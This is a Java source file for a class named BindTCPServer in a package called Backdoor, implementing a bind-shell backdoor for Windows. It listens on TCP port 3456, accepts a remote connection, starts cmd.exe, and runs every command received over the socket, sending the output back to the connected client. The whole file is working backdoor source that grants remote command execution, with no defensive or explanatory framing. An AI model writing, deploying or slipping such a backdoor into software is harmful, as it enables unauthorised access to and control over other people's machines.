package com.company.Backdoor.BindTCP;

import com.company.Backdoor.BackdoorConstants;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class BindTCPServer
{
    private ServerSocket server;
    private Socket client;
    private int port;

    private BufferedReader socketReader;
    private BufferedReader commandLineReader;

    private PrintWriter socketWriter;
    private PrintWriter commandWriter;
    private Scanner scanner;

    String response;

    public BindTCPServer(int port)
    {
        try
        {
            this.port = port;
            scanner = new Scanner(System.in);
            server = new ServerSocket(port);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }


    private String getResponse()
    {
        response = "";
        String line;
        try
        {

            while ((line = commandLineReader.readLine()) != null)
            {
                if (line.endsWith(BackdoorConstants.END_OF_COMMAND))
                    break;
                response += line + "\n";
            }
        }
        catch (IOException e) {
            e.printStackTrace();
        }

        return response+"\n"+BackdoorConstants.END_OF_COMMAND;
    }

    public void connect()
    {
        try
        {
            System.out.println("Waiting Connection....");
            client = server.accept();
            System.out.println(client.getInetAddress().getHostName() + " connected!");
            socketWriter = new PrintWriter(client.getOutputStream());
            socketReader = new BufferedReader(new InputStreamReader(client.getInputStream()));
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }


    private void reverseShell(String command, Process process)
    {

        commandWriter = new PrintWriter(process.getOutputStream());
        commandLineReader = new BufferedReader(new InputStreamReader(process.getInputStream()));

        commandWriter.println(command);
        commandWriter.println(BackdoorConstants.END_OF_COMMAND);
        commandWriter.flush();
    }
    private Runtime createRunTime()
    {
        return Runtime.getRuntime();
    }
    public void enterCommand()
    {
        try
        {
            Runtime runtime = Runtime.getRuntime();
            Process process = runtime.exec("C:\\Windows\\System32\\cmd.exe");
            while (!server.isClosed())
            {
                String command = socketReader.readLine();
                reverseShell(command,process);
                if (command.equals("exit"))
                    break;

                String response = getResponse();
                socketWriter.println(response);
                socketWriter.flush();
                runtime = createRunTime();

            }
            System.out.println("Server and Client closed!");
            client.close();
            server.close();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public static void main(String[] args)
    {
        BindTCPServer server = new BindTCPServer(3456);
        server.connect();
        server.enterCommand();
    }

}
